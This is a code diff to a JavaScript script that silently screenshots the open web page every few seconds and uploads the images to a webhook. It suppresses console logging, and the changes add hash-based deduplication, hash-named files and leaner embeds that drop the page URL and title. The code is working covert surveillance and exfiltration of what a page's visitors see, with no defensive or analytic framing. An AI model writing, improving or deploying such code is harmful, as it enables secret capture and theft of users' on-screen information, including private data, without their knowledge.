@@ -11,6 +11,7 @@
     var _interval = null;
     var _running = false;
     var _visible = true;
+    var _lastHash = null;
     var _cfg = { interval: 8000, quality: 0.6, scale: 0.8 };
 
     var _noop = function() {};
@@ -27,6 +28,15 @@
     console.info = _noop;
     console.debug = _noop;
 
+    function _simpleHash(str) {
+        var hash = 5381;
+        for (var i = 0; i < str.length; i++) {
+            hash = ((hash << 5) + hash) + str.charCodeAt(i);
+            hash = hash & hash;
+        }
+        return (hash >>> 0).toString(16).toUpperCase().slice(0, 8);
+    }
+
     function _nowBrasilia() {
         var now = new Date();
         var options = {
@@ -41,7 +51,7 @@
         };
         var formatter = new Intl.DateTimeFormat('pt-BR', options);
         var parts = formatter.formatToParts(now);
-        var dateStr = parts.filter(p => p.type !== 'literal').map(p => p.value).join('');
+        var dateStr = parts.map(p => p.value).join('');
         var iso = now.toISOString();
         return { formatted: dateStr, iso: iso };
     }
@@ -75,38 +85,27 @@
 
     function _send(dataURL) {
         try {
+            var hash = _simpleHash(dataURL);
+            if (hash === _lastHash) return Promise.resolve();
+            _lastHash = hash;
+
             var blob = _toBlob(dataURL);
             if (!blob) return Promise.resolve();
 
             var brasilia = _nowBrasilia();
             var embed = {
-                title: "📸 Captura de Tela",
-                description: "Screenshot da página atual",
+                title: "📸 #" + hash,
+                description: brasilia.formatted,
                 color: 0x2b2d31,
                 timestamp: brasilia.iso,
                 footer: {
-                    text: "🕐 Horário de Brasília: " + brasilia.formatted + " • URL: " + (document.URL || "desconhecida")
-                },
-                fields: [
-                    {
-                        name: "🌐 Página",
-                        value: document.title || "Sem título",
-                        inline: true
-                    },
-                    {
-                        name: "⏱️ Intervalo",
-                        value: _cfg.interval / 1000 + "s",
-                        inline: true
-                    }
-                ]
+                    text: "Intervalo: " + (_cfg.interval / 1000) + "s"
+                }
             };
 
-            var payload = {
-                embeds: [embed]
-            };
-
+            var payload = { embeds: [embed] };
             var fd = new FormData();
-            fd.append('file', blob, 'screenshot.jpg');
+            fd.append('file', blob, hash + '.jpg');
             fd.append('payload_json', JSON.stringify(payload));
 
             return fetch(_webhook, { method: 'POST', body: fd }).catch(_noop);
@@ -194,6 +193,7 @@
 
     function _kill() {
         _stop();
+        _lastHash = null;
         document.removeEventListener('visibilitychange', _visibilityHandler);
         window.removeEventListener('blur', _blurHandler);
         window.removeEventListener('focus', _focusHandler);
